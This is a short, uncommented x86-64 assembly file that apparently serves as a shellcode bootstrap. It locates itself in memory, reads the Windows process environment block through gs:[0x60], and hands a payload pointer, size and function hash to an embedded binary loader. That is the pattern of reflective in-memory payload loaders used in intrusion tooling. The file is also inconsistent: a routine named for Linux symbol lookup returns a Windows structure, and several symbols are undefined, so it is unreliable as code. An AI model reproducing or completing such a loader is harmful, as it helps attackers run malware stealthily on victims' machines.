BITS 64

SECTION .text

global _start

_start:
    call    .get_pc
.get_pc:
    pop     rax

    lea     rbx, [rax + loader - .get_pc]

    mov     rdi, rax
    add     rdi, payload_data - .get_pc
    mov     rsi, payload_size
    mov     edx, func_hash
    mov     rcx, 0
    mov     r8d, 0
    lea     r9, [rax + dlsym_resolver - .get_pc]
    mov     dword [rsp - 4], 0

    push    rbp
    mov     rbp, rsp
    and     rsp, -16
    sub     rsp, 0x30

    call    rbx

    mov     rsp, rbp
    pop     rbp
    ret

dlsym_resolver:
    mov     rax, gs:[0x60]
    ret

loader:
    incbin  "loader.bin"

payload_data:
